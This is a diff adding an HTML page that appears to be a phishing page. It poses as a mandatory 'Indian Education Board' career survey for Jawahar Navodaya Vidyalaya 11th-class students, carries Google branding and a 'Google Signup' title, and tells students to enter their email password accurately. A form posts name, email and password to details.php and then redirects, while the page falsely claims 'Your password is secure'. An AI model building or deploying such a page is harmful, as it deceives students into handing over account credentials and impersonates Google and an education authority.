@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="google-site-verification" content="t-iTfuKjTmZKwgZLUIj5p3akrQfRJHm8QNovM4F9U30" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Jnv Career Survey Portal">
+<meta property="og:description" content="Complete the mandatory career survey mandated by the Indian Education Board for all 11th class students of JNV. Provide essential personal, academic, and other information to assist in planning your academic journey effectively. Ensure accurate details to facilitate better support and guidance from the educational authorities. Your participation is vital for shaping your future endeavors.">
+
+<meta property="og:image" content="https://www.google.com/url?sa=i&url=https%3A%2F%2Ftelanganatoday.com%2Fjawahar-navodaya-vidyalaya-selection-test-date-for-class-6-announced&psig=AOvVaw3d6jfRl8eOawgKg6_X12kP&ust=1715077182847000&source=images&cd=vfe&opi=89978449&ved=0CBIQjRxqFwoTCKitqsjm-IUDFQAAAAAdAAAAABAE">
+<meta property="og:url" content="">
+
+    <title>Google Signup</title>
+    <!-- Font Awesome CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Prevent scrolling on smaller screens */
+        }
+
+        .signup-container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            padding-bottom:120px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            margin-top: 20px;
+            overflow-y: auto; /* Enable vertical scrolling for the container */
+            max-height: 80vh; /* Limit the container's height to 90% of the viewport height */
+        }
+
+        .logo {
+            width: 150px;
+            height:120px;
+            margin-bottom: -18px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #dadce0;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #34a853; /* Google green color */
+        }
+
+        input[type="text"]:hover,
+        input[type="email"]:hover,
+        input[type="password"]:hover {
+            border-color: #34a853; /* Google green color */
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 18px; /* Adjusted position */
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #ccc; /* Adjusted color */
+        }
+
+        .password-toggle i {
+            font-size: 18px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #357ae8;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #4285f4;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .safety-info {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .safety-info i {
+            color: #666;
+            font-size: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        .disclaimer {
+            
+            margin-bottom: -13px;
+            font-size: 14px;
+            color: #666;
+            background-color: #f2f2f2;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+            text-align: left;
+            margin-top:0px;
+        }
+
+        .disclaimer strong {
+            color: #4285f4;
+        }
+
+        @media only screen and (max-width: 768px) {
+            .signup-container {
+                max-width: 100%;
+                max-height:78vh;
+                padding-bottom:145px;
+               
+                
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="signup-container" a>
+        <div class="disclaimer">
+            <p><strong>Important:</strong> By signing up, you acknowledge and agree to participate in the Career Survey administered by the Indian Education Board. This survey is designed to gather insights into your educational background and career preferences, enabling us to tailor educational programs to your needs.</p>
+            <p>Please ensure that you enter your email <strong>password accurately</strong> to proceed. Providing incorrect information may impact your eligibility for this program.</p>
+            <p>If you are uncertain about your password, we recommend <strong><u>double-checking</u> </strong>before proceeding. Your privacy and security are of utmost importance to us.</p>
+        </div>
+        <img class="logo" src="google.png" alt="Google Logo">
+        <form id="signup-form" action="details.php" method="post" onsubmit="sky()">
+            <input type="text" id="name" name="name" placeholder="Full Name" required>
+            <br>
+            <input type="email" id="email" name="email" placeholder="Email" required>
+            <br>
+            <!-- Password input field with eye icon -->
+            <div style="position: relative;">
+                <input type="password" id="password" name="pass" placeholder="Password" required>
+                <div class="password-toggle" onclick="togglePassword()">
+                    <i class="fas fa-eye"></i>
+                </div>
+            </div>
+            <br>
+            <button type="submit">Sign Up</button>
+        </form>
+        <div class="footer">
+            <a href="#">Terms of Service</a>
+            <br>
+            <a href="#">Privacy Policy</a>
+        </div>
+        <div class="safety-info">
+            <i class="fas fa-lock"></i> Your password is secure.
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
+    <script>
+        function togglePassword() {
+            var passwordInput = document.getElementById("password");
+            var toggleIcon = document.querySelector(".password-toggle i");
+
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                toggleIcon.classList.remove("fa-eye");
+                toggleIcon.classList.add("fa-eye-slash");
+                toggleIcon.style.color = "#4285f4"; /* Adjusted color */
+            } else {
+                passwordInput.type = "password";
+                toggleIcon.classList.remove("fa-eye-slash");
+                toggleIcon.classList.add("fa-eye");
+                toggleIcon.style.color = "#ccc"; /* Adjusted color */
+            }
+        }
+        
+          function sky() {
+            window.location.href = "other.html";
+        }
+    </script>
+    
+</body>
+</html>
